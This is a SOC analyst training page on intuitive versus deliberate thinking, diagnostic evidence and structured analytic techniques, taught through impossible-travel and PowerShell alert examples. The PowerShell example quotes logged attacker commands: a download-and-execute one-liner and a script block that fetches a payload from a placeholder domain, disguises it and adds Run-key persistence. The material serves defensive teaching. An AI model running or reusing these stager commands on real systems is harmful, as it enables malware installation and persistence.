---
title: "System 1 and System 2, \"Do You Need More Data?\" and Structured Analytic Techniques — Putting a Check on Fast Thinking"
tags:
  - training
  - blue-team
  - soc
  - analysis
  - structured-analysis
---

# System 1 and System 2, "Do You Need More Data?" and Structured Analytic Techniques — Putting a Check on Fast Thinking { #system1-2-sat }

!!! abstract "What this page covers"
    The perception and memory section showed how our minds mislead us, and the mental models section filled the toolbox. This section is about the fix: methods that make analysis reliable even with incomplete, ambiguous data. This first page lays the foundation. It starts with the plan for the section (generating hypotheses, evaluating them, organising evidence), then explains **System 1 and System 2 thinking** — fast intuition versus slow deliberate analysis — with a worked "impossible travel" alert that shows when intuition is right and when it will burn you. Next comes the question **"do you need more data?"**: the "collect everything" mosaic approach versus the way a doctor diagnoses, walked through a suspicious PowerShell alert with three hypotheses, an evidence table that scores how *diagnostic* each piece of evidence is, and the few targeted checks (4688 parent process, 4104 script block, destination, change ticket) that settle it. Finally, **structured analytic techniques** — what they are (decomposing and externalising a problem), what they are not (a replacement for intuition), and their four categories (hypothesis generation, hypothesis testing, data organisation, challenge analysis) with where each one fits in a SOC investigation. The 2026 view and practice questions close the page.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. The company (Kestrel Logistics), hostnames, accounts, domains, IPs, process names and log lines are invented for illustration (`.example`, documentation and private IPs). Researchers and their ideas are described in my own words.

## The 8 key points { #key-points }

1. **The fix for perception and memory problems is method, not effort.** Trying harder doesn't remove bias; working in a structured way — generating several hypotheses, testing them properly, and organising evidence outside your head — does.
2. **System 1 is fast, automatic intuition built from experience and mental models.** It is efficient and usually right on familiar, routine cases. It is also where anchoring, confirmation bias and premature closure live.
3. **System 2 is slow, conscious, deliberate analysis.** It costs time and energy, so we can't use it for everything — but we must switch to it when the stakes are high, the case is novel or ambiguous, or the decision is hard to undo.
4. **The goal is not "never use System 1".** It is to keep System 1 in check: let intuition propose, and let deliberate analysis verify before an important conclusion is final.
5. **More data is not automatically better analysis.** The mosaic approach (collect everything until the picture appears) is slow, expensive and still vulnerable to bias, because people read the extra data through their first theory.
6. **Diagnose like a doctor.** List the possible explanations, then pick the few targeted tests that tell them apart. Evidence that fits every hypothesis equally — however alarming — has little diagnostic value.
7. **Structured analytic techniques decompose and externalise a problem.** They get the problem out of limited working memory and onto paper or a screen, where its parts can be checked one at a time and by other people.
8. **There are four families of technique.** Hypothesis generation (structured brainstorming), hypothesis testing (Analysis of Competing Hypotheses), data organisation (link analysis, event matrices, timelines) and challenge analysis (premortem, self-critique, "What if?", red team, Team A/Team B).

## Why this matters in a SOC { #why }

Think of an experienced taxi driver. After years on the road they drive most of the route without thinking: changing lanes, reading traffic, choosing turns. That automatic skill is what makes them good — and it is also why, on the day the road layout changes, they are the one most likely to turn into a street that is now one-way. Nothing in their automatic routine says "stop, this is different". A good driver learns to notice the moments that call for full attention: a new junction, a detour sign, a child near the road.

Back to the technical reality. A SOC analyst handles dozens of alerts a shift, and most of them really are routine. Intuition — "that's the vulnerability scanner again", "that's the backup job" — is what keeps the queue moving, and a SOC that refused to use it would drown. But the incidents that matter most are, by definition, the ones that *look* routine and aren't, or the ones nobody has seen before. The previous sections explained why: perception filters new information through existing mindsets, working memory overflows on complex cases, and experience builds ruts. This section gives you the practical counterweight. The skill this page teaches is recognising *which* moments need System 2, and having a ready method for those moments instead of just "thinking harder".

## The plan for this section { #section-plan }

The methods in this section follow the order of an investigation:

| Step | Question | Typical failure it fixes | Page |
| --- | --- | --- | --- |
| Hypothesis generation | What *could* explain this? | Only one explanation ever considered; anchoring on the first idea | [Hypothesis generation](hypothesis-generation.md) |
| Hypothesis evaluation | Which explanation does the evidence actually support? | Satisficing, confirmation bias, choosing the popular answer | Hypothesis generation, then Analysis of Competing Hypotheses (ACH) |
| Evidence organisation | How do the pieces connect, and in what order? | Losing track of entities and time in working memory | Link analysis and the event matrix |

Challenge analysis — deliberately attacking your own finished conclusion — belongs to case review and comes later in this guide.

## System 1 versus System 2 thinking { #system1-system2 }

### The two systems { #two-systems }

Psychologists who study judgement describe two broad modes of thinking. The labels *System 1* and *System 2* were popularised by the psychologist Daniel Kahneman, whose 2011 book *Thinking, Fast and Slow* summarised decades of research on judgement and decision-making with Amos Tversky and others.

| | System 1 — intuitive | System 2 — analytical |
| --- | --- | --- |
| Speed | Fast, almost instant | Slow |
| Effort | Effortless, automatic | Effortful, tiring |
| Awareness | Unconscious — you notice the answer, not the process | Conscious — you can describe each step |
| Built from | Experience, familiar patterns, mental models | Explicit reasoning, procedures, evidence checked one by one |
| Good at | Routine, familiar situations with quick feedback | Novel, ambiguous, high-stakes situations |
| Typical errors | Anchoring, confirmation bias, seeing what you expect, premature closure | Slowness; analysis paralysis; still biased if the method is weak |
| SOC example | "That's the backup server's nightly SMB burst" | Listing explanations for a burst at an unusual hour and checking each |

A useful way to picture the relationship: System 1 is always on and constantly offers answers; System 2 is lazy and mostly accepts them. It only steps in when something forces it — a surprise, a contradiction, or a deliberate habit. **[Supplement]** Kahneman himself called the two systems useful fictions: they are not two places in the brain, just a convenient way to describe two styles of thinking that blend in practice.

The goal for an analyst is *not* to switch System 1 off. That is impossible, and you would be uselessly slow. The goal is to keep it in check — let intuition propose, and make deliberate analysis verify whenever being wrong would be costly. People do this naturally for big personal decisions (buying a house, choosing a job); an incident with real business impact deserves the same treatment.

### When to switch to System 2 { #system2-triggers }

Because System 2 won't start itself, you need explicit triggers. A practical list for a SOC:

- **High stakes.** The asset, user or data involved is sensitive (domain controllers, finance, executives, crown-jewel data — see [sensitive hosts, users and data](../alert-triage/exfil-destruction-sensitive.md)).
- **Novelty.** You haven't seen this alert, technique or pattern before, or a familiar alert appears in an unfamiliar place or time.
- **Ambiguity or contradiction.** The evidence points in two directions, or one fact doesn't fit your explanation.
- **An irreversible decision.** Closing as benign, wiping a host, telling a regulator, blocking a business partner, attributing to an actor.
- **Fast certainty on a big case.** If you feel completely sure within seconds about something that matters, that feeling is System 1 — pause and check.
- **Disagreement.** A colleague reads the same evidence differently.
- **The case keeps growing.** More than a handful of hosts, accounts or indicators means working memory is overloaded; externalise.

### Worked example: the "impossible travel" alert { #impossible-travel }

At 09:12 the identity-protection tool raises this alert for Kestrel Logistics:

```
alert_name:     Impossible travel activity
severity:       Medium
user:           m.okafor@kestrel-logistics.example
first_signin:   2026-11-24T08:21:07Z  ip=198.51.100.40  location=Sydney, AU
second_signin:  2026-11-24T08:58:44Z  ip=203.0.113.88   location=Frankfurt, DE
distance_km:    16,500   time_between_min: 37
```

- `alert_name` — the identity platform saw two sign-ins for the same user that would require faster-than-possible travel.
- `user` — Mia Okafor, accounts-payable lead (a finance role).
- `first_signin` / `second_signin` — time, source IP and geolocated city for each.
- `distance_km` / `time_between_min` — 16,500 km in 37 minutes. Nobody flies that fast.

**The System 1 answer** arrives instantly: "Impossible-travel alerts are always VPN or the cloud proxy. Close it." And System 1 has a point — at Kestrel, roughly nine out of ten of these alerts *are* caused by the corporate secure web gateway, whose egress IPs geolocate to other countries.

**The triggers** say slow down: the user is in finance (high stakes), and closing as benign is the irreversible-feeling decision. So we spend five minutes in System 2 and look at the two sign-ins side by side:

```
time                  ip              app             client_app          device_id   mfa_result               session_type
2026-11-24T08:21:07Z  198.51.100.40   Outlook (web)   Chrome 131 / Win11  d7c1-…-a92  satisfied: push approved new_session
2026-11-24T08:58:44Z  203.0.113.88    Outlook (web)   Chrome 131 / Linux  (none)      satisfied: claim in token reused_session_token
```

Line by line:

- `ip` — 198.51.100.40 is Kestrel's Sydney office egress. 203.0.113.88 is **not** on the list of the gateway's egress addresses, so the "it's the proxy" explanation doesn't hold.
- `client_app` — the first sign-in is Chrome on Windows 11 (Kestrel's standard build); the second is Chrome on Linux, which no Kestrel finance user runs.
- `device_id` — the first sign-in comes from a managed, registered device; the second from no registered device.
- `mfa_result` — the first sign-in did multi-factor authentication (a push approval). The second didn't prompt at all: it was satisfied by an MFA claim *already inside the token*.
- `session_type` — `reused_session_token`: the second sign-in replayed an existing session rather than logging in fresh.

That pattern — a stolen session cookie replayed from a new device with no new MFA prompt — is what adversary-in-the-middle phishing kits produce. The user enters their password and approves MFA on a fake login page that relays everything to the real one, and the kit keeps the resulting session cookie. In ATT&CK terms: **T1557 Adversary-in-the-Middle** for the relay, **T1539 Steal Web Session Cookie** for the theft and **T1550.004 Use Alternate Authentication Material: Web Session Cookie** for the replay. Checking the mail logs confirms it: at 08:17 Mia received an email "Updated remittance portal" with a link to `kestrel-remit.example`, and her browser history shows the page at 08:20.

The case escalates: revoke the user's sessions and refresh tokens, reset credentials, look for new inbox rules (**T1114.003 Email Forwarding Rule**) and check for changes to supplier bank details. System 1 was right nine times out of ten — and the tenth was the one that mattered. Notice that System 2 didn't need hours: five targeted minutes, triggered by a rule, not by a feeling.

## Do you need more data? { #more-data }

### The mosaic approach versus diagnosis { #mosaic-vs-diagnosis }

When a case is unclear, the instinct is to collect more: another day of logs, a full packet capture, a memory image, the user's mailbox. Heuer, whose work grounds the perception section, devoted a whole chapter to the question of whether analysts really need more information — and his answer was usually no. Two styles of analysis show why.

The **mosaic approach** treats analysis like assembling a mosaic: collect as many tiles as possible and the picture will eventually appear. The problem is that the picture usually "appears" early — your first theory — and every new tile is then read through that theory. Extra data raises confidence much more than it raises accuracy. It also costs time while the attacker keeps moving.

The **medical-diagnosis approach** works the way a good doctor does:

1. **Observe the symptoms.** The patient has a fever and a cough.
2. **List the possible diagnoses.** A cold, flu, pneumonia, COVID-19.
3. **Choose targeted tests that tell them apart.** Not every test the hospital offers — that would be enormously expensive — but the few whose results differ between the diagnoses: a rapid antigen test, listening to the lungs, perhaps a chest X-ray.
4. **Decide.** The results rule some diagnoses out and leave one standing.

The differences from the mosaic approach are what matter for us. The focus is not on complete information but on key items. The aim of each test is to *discriminate* between hypotheses, not to confirm the favourite. And the method itself is valued because it has to be cost-effective — a SOC has a queue, and an attacker who doesn't wait. The takeaway: **more data is not always the answer; better analysis is.**

### Diagnosticity: why some evidence is worth more { #diagnosticity }

The key idea behind targeted tests is **diagnosticity** (how much a piece of evidence helps you tell hypotheses apart). A fever is consistent with cold, flu, pneumonia *and* COVID-19, so on its own it tells the doctor almost nothing about *which* one — it has low diagnosticity, even though it is the most obvious symptom. A positive antigen test is consistent with only one of them — high diagnosticity.

In a SOC, the alert itself is often the fever: alarming, but consistent with both benign and malicious explanations. The skill is finding the checks that are *inconsistent* with at least one hypothesis. This idea returns, in full, in Analysis of Competing Hypotheses (a later page in this section).

### Worked example: a PowerShell download alert { #powershell-diagnosis }

At 14:03 the EDR raises:

```
rule:        PowerShell downloaded and executed remote content
severity:    High
host:        KL-WS-0418   user: KESTREL\j.tanaka
process:     powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr https://pkg.repo-cdn.example/setup.ps1 -UseBasicParsing)"
```

- `rule` — PowerShell fetched something from the internet and ran it in memory.
- `user` — Jun Tanaka, a developer on the warehouse-scanner team.
- `process` — the command line: `iwr` (`Invoke-WebRequest`) downloads `setup.ps1`, and `iex` (`Invoke-Expression`) runs the downloaded text as code. `-ExecutionPolicy Bypass` skips the script policy for this session. This "download and run" pattern is what attacker stagers do (**T1059.001 PowerShell**, **T1105 Ingress Tool Transfer**) — and also what many legitimate installers tell users to paste.

**Step 1: list the hypotheses.**

- **H1** — IT's software-deployment agent ran a packaging script.
- **H2** — The developer pasted a legitimate tool's install one-liner (many developer tools publish exactly this pattern).
- **H3** — Malicious: a phishing lure or a fake "fix this error" web page tricked the user into running a stager (**T1204.004 User Execution: Malicious Copy and Paste**), or malware already on the host ran it.

**The mosaic temptation** would be: pull 7 days of every log from the host, acquire memory, capture all traffic, review Jun's whole mailbox, read the browser history for a week. That's a day's work, and most of it would be consistent with all three hypotheses.

**Step 2: score the evidence you already have by diagnosticity.** C = consistent, I = inconsistent, N = neutral.

| Evidence | H1 IT deployment | H2 dev tool installer | H3 malicious | Diagnostic? |
| --- | --- | --- | --- | --- |
| PowerShell downloaded and ran a remote script | C | C | C | **No** — the "fever" |
| `-ExecutionPolicy Bypass` on the command line | C | C | C | No — common in all three |
| User is a developer | N | C | C | Barely |

Everything so far fits every hypothesis. The alert's severity says "High", but none of this tells us *which* story is true.

**Step 3: choose the tests whose results differ between hypotheses.**

| Test | If H1 | If H2 | If H3 |
| --- | --- | --- | --- |
| **Parent process** (4688) | The deployment agent, running as SYSTEM | `WindowsTerminal.exe` / `pwsh.exe` / an IDE, as the user | `explorer.exe` (Run dialog, LNK), a browser, an Office app — or an unknown process |
| **Destination domain** | Kestrel's internal package server | The tool's well-known publisher domain | Newly registered or look-alike domain |
| **Script content** (4104) | Kestrel packaging code | Publisher's installer | Downloader, obfuscation, persistence |
| **Change ticket / deployment record** | Exists | Not needed | None |

Four checks, perhaps fifteen minutes in total. Here are the results.

The process-creation event, **Windows event 4688** ("A new process has been created"). It is logged every time a process starts when process-creation auditing is enabled, and with command-line auditing switched on it records the full command. Attackers care because it records execution even when the payload never touches disk:

```
EventID: 4688
SubjectUserName:     j.tanaka
NewProcessName:      C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentProcessName:   C:\Windows\explorer.exe
CommandLine:         powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr https://pkg.repo-cdn.example/setup.ps1 -UseBasicParsing)"
TokenElevationType:  %%1938
```

- `SubjectUserName` — the user's own account, not SYSTEM: that weakens H1.
- `ParentProcessName: explorer.exe` — PowerShell was started by Explorer, which is what happens when someone uses the Win+R Run dialog or double-clicks a shortcut. A developer pasting into their terminal (H2) would show the terminal or an IDE as parent. This fits H3's "paste into Run dialog" lure best.
- `TokenElevationType: %%1938` — a limited (non-elevated) token: an ordinary user session, not an admin installer.

The destination: `pkg.repo-cdn.example` is not Kestrel's package server, and domain records show it was registered six days ago. No developer tool publisher uses it.

The script block, **Windows event 4104** (PowerShell script block logging: "Creating Scriptblock text"). It is logged in the `Microsoft-Windows-PowerShell/Operational` channel when script block logging is enabled — and PowerShell also logs suspicious-looking blocks automatically, even without the policy. Attackers care because it records the code *after* PowerShell has decoded it, so obfuscation and in-memory scripts are revealed:

```
EventID: 4104
ScriptBlockText:
  $u='https://pkg.repo-cdn.example/a/'+$env:COMPUTERNAME
  $p="$env:APPDATA\RtkAudio\rtkaud.exe"
  (New-Object Net.WebClient).DownloadFile($u,$p)
  New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RtkAudio' -Value $p -Force
  Start-Process $p
```

- Line 1 — builds a URL containing the computer name: a per-victim download, typical of a stager.
- Line 2 — saves the payload in the user's AppData under a name imitating an audio driver (**T1036.005 Masquerading: Match Legitimate Resource Name or Location**).
- Line 3 — downloads the payload (**T1105**).
- Line 4 — adds a Run key so it starts at every logon (**T1547.001 Registry Run Keys / Startup Folder**).
- Line 5 — runs it.

No change ticket exists. Every discriminating test came back inconsistent with H1 and H2 and consistent with H3. The analyst escalates, isolates KL-WS-0418 and starts scoping — and only now is the "collect more" work worth it, because it is aimed at a known question (what did `rtkaud.exe` do, and where else did `pkg.repo-cdn.example` appear?).

If the results had been the opposite — parent `WindowsTerminal.exe`, a publisher's long-standing domain, installer code — the case would have closed as benign in the same fifteen minutes, *with a documented reason* rather than a hunch.

**[Supplement]** The diagnosis approach doesn't mean "never collect more". It means collect with a purpose: before each new query, write down which hypothesis its result could rule out. If no possible result would change your view, skip it.

## Structured analytic techniques { #sats }

### What they are { #sats-what }

Security analysis will never be a laboratory science: we work with missing logs, attackers who hide on purpose and data that can be read several ways. But we can do much better than raw intuition. **Structured analytic techniques (SATs)** are step-by-step methods, developed mostly in the intelligence community, for reasoning under exactly those conditions. Their common core is two moves the memory page already introduced:

- **Decomposition** — break the problem into parts small enough to think about one at a time: hypotheses, pieces of evidence, entities, events.
- **Externalisation** — get those parts out of your head and into a list, matrix, graph or timeline where you, and others, can see them all at once.

An analogy: an airline pilot with twenty years' experience still runs the pre-flight checklist. The checklist doesn't replace their skill; it catches the one thing that skill misses on a tired day. SATs work the same way. They are **not** a replacement for intuitive System 1 judgement — intuition still proposes ideas, spots oddities and gets routine cases done — but a check and balance that engages System 2 when it is needed, and makes the reasoning visible so a colleague or reviewer can follow and challenge it.

The standard reference is the book *Structured Analytic Techniques for Intelligence Analysis* by Richards Heuer and Randolph Pherson (first edition 2010; the current third edition, with Pherson as lead author, came out in 2020). It describes dozens of techniques and, as its authors point out, they apply far beyond government intelligence — law enforcement, business, finance and any field where qualitative judgements are made with incomplete data. A SOC is one of those fields.

### The four categories { #sat-categories }

| Category | Purpose | Techniques covered in this guide | Where it fits in a SOC case |
| --- | --- | --- | --- |
| **1. Hypothesis generation** | Get every plausible explanation on the table before judging any | Structured brainstorming and creative-thinking rules | Start of triage on any non-routine alert; when a case stalls |
| **2. Hypothesis testing** | Decide which explanation the evidence supports, by trying to *disprove* each | Analysis of Competing Hypotheses (ACH) | Before escalation or closure of a significant case; attribution questions |
| **3. Data organisation** | See connections and order that working memory can't hold | Link analysis, event matrices and timelines | Any case with many hosts, accounts, indicators or events |
| **4. Challenge analysis** | Attack your own finished conclusion before someone else (or reality) does | Premortem, structured self-critique, "What if?" analysis, red team, Team A/Team B | Case review and quality control before a major report or decision |

### Worked example: one case, four categories { #case-four-categories }

The PowerShell case above, followed to its end, uses all four:

1. **Generation.** Before judging, the analyst listed H1–H3. In a fuller session (next page) they would also have listed "a red-team exercise", "a test by a colleague" and "malware already on the host ran this" — each with different next checks.
2. **Testing.** The diagnosticity table *is* a small ACH: hypotheses across the top, evidence down the side, and attention on the inconsistent cells.
3. **Organisation.** Scoping finds `pkg.repo-cdn.example` contacted from three more workstations. An event matrix (host × time × event) and a link chart (domain → hosts → users → lure email) keep fifteen entities straight.
4. **Challenge.** Before the incident report goes to management, the lead runs a premortem: "Imagine in a month we learn we got this wrong. What happened?" The answer — "we only checked machines with EDR; the six kiosks don't have it" — produces one more scoping task.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    The two-system description of thinking, the warning against "collect everything" analysis and the core of structured analytic techniques — decompose, externalise, consider alternatives, seek disconfirming evidence — remain standard in intelligence and SOC training. Heuer's work is still widely recommended, and the Heuer and Pherson book (third edition, 2020) is the current reference. Hypothesis-driven investigation and threat hunting, where each query is meant to test a stated hypothesis, are mainstream practice. The impossible-travel and PowerShell examples above are current attack patterns: session-cookie theft through adversary-in-the-middle phishing and "paste this command" lures are among the most common initial-access routes reported in 2025–2026.

!!! info "[Changed] What has changed"
    - **AI triage is now a very fast, very confident System 1.** By 2026 many SOCs use AI assistants or agentic triage tools that summarise alerts, propose verdicts and draft investigations. They reduce toil, but their verdict arrives like intuition — instant and fluent — and invites the same uncritical acceptance. Research and practitioner reports describe **automation bias**: analysts accept a machine's conclusion and check less. Treat an AI verdict as one more hypothesis to test, apply the same System 2 triggers, and make the tool show its evidence.
    - **The ATT&CK technique set used above is newer than many older notes.** "Paste this into the Run dialog" lures now have their own sub-technique, **T1204.004 Malicious Copy and Paste** (added in 2025), and identity-centric techniques such as session-cookie theft and replay are far more prominent in reporting than malware-only intrusions.
    - **The science behind the popular book has been partly revised.** Daniel Kahneman died in March 2024. The two-system framework is still widely used, but some studies cited in *Thinking, Fast and Slow* — especially on social priming — failed to replicate, and Kahneman publicly acknowledged relying too much on small studies. The broad point (fast intuition is efficient but biased) stands; specific experiments are not settled facts.
    - **More telemetry, not less.** Cloud identity, SaaS and EDR logging mean analysts can pull far more data than in 2022. That makes the "do you need more data?" question more important, not less: the bottleneck is analysis, not collection.

!!! warning "[Caution] Wrong or risky to do the old way"
    - **Don't treat structured techniques as proof.** Experimental studies of techniques such as ACH have found mixed results: they make reasoning transparent and reviewable, but they don't guarantee a correct or bias-free answer, and they can give false confidence if the inputs (hypotheses, evidence) are poor. Use them to expose reasoning, not to certify it.
    - **Don't use System 2 on everything.** Running every low-severity alert through a full structured method burns the queue and burns out analysts. The skill is the trigger list, plus automation or tuning for alerts that are truly routine.
    - **Don't let "AI already checked it" replace your diagnostic tests.** An AI summary that says "benign developer activity" is consistent with the alert; it is not evidence that rules out the malicious hypothesis. Look at the discriminating fields (parent process, destination, decoded script, device and MFA details) yourself.
    - **Don't collect blindly during an active intrusion.** Imaging every machine "to be safe" delays containment. Collect what answers a stated question, contain, then widen.

## Practice questions { #quiz }

### Question 1

An analyst says: "System 1 thinking causes bias, so the best SOC analysts never trust their gut." Is this right? Explain the correct relationship between System 1 and System 2 in triage, and give three situations that should switch an analyst into System 2.

??? success "Answer and explanation"
    It is wrong. System 1 — fast, intuitive judgement from experience — is what makes routine triage possible; without it the queue would never move, and on familiar cases it is usually right. The aim is to **keep it in check**, not to switch it off: intuition proposes, deliberate analysis verifies when being wrong is costly.

    Good System 2 triggers: (1) a high-stakes asset, user or data set (a finance user, a domain controller); (2) a novel alert, technique, place or time; (3) contradictory or ambiguous evidence; (4) an irreversible decision such as closing as benign, wiping a host or notifying a regulator; (5) feeling completely certain within seconds about something important; (6) disagreement between analysts; (7) a case that has grown beyond what you can hold in your head.

### Question 2

An alert fires: "Rundll32 made an outbound network connection" on a sales laptop. Your colleague wants to pull a full memory image and seven days of every log before saying anything. Using the medical-diagnosis approach, describe what you would do instead, and give one example of evidence with low diagnosticity and one with high diagnosticity.

??? success "Answer and explanation"
    First list the hypotheses, for example: H1 a legitimate component that uses `rundll32` (some vendor software does), H2 a signed-binary proxy execution of a malicious DLL (**T1218.011 System Binary Proxy Execution: Rundll32**), H3 malware already present using `rundll32` for C2. Then choose a few targeted tests whose results differ: the full command line and which DLL was loaded (path, signer, hash prevalence), the parent process (4688 or Sysmon 1), the destination's reputation and age, and whether other managed laptops show the same pattern.

    Low diagnosticity: "rundll32 connected to the internet" — that is the alert itself and fits all three. High diagnosticity: "the DLL is `C:\Users\…\AppData\Local\Temp\x7.dat`, unsigned, seen on no other machine, and the destination domain was registered last week" — inconsistent with H1. Only after the targeted tests point somewhere is the heavy collection worth doing, and then for a specific question.

### Question 3

Name the four categories of structured analytic techniques, give one technique from each, and say at which point in a SOC investigation each is most useful.

??? success "Answer and explanation"
    (1) **Hypothesis generation** — structured brainstorming; at the start of triage on non-routine alerts and when a case stalls. (2) **Hypothesis testing** — Analysis of Competing Hypotheses (ACH); before escalating or closing a significant case, or when making attribution claims. (3) **Data organisation** — link analysis, event matrices and timelines; whenever a case involves many hosts, accounts, indicators or events. (4) **Challenge analysis** — premortem, structured self-critique, "What if?" analysis, red team, Team A/Team B; during case review, before a major report or decision. All of them work by decomposing the problem and externalising it so the reasoning can be checked — they are a check on intuition, not a replacement for it.

## Related { #related }

- [Hypothesis generation, evaluation mistakes and confirmation bias](hypothesis-generation.md) — next page
- [Perception](../analyst-cognition/perception.md) · [Memory and experience](../analyst-cognition/memory-experience.md) — the problems these methods fix
- [The Pyramid of Pain, MITRE ATT&CK and when each model applies](../mental-models/pyramid-attack-summary.md) — the models these methods use
- [Process creation events](../important-events/process-creation.md) · [Alert triage: sensitive hosts, users and data](../alert-triage/exfil-destruction-sensitive.md)
- [PowerShell cradles](../../../adversary/powershell-cradles.md) · [Persistence](../../../adversary/persistence.md) · [Phishing delivery](../../../adversary/phishing-delivery.md)
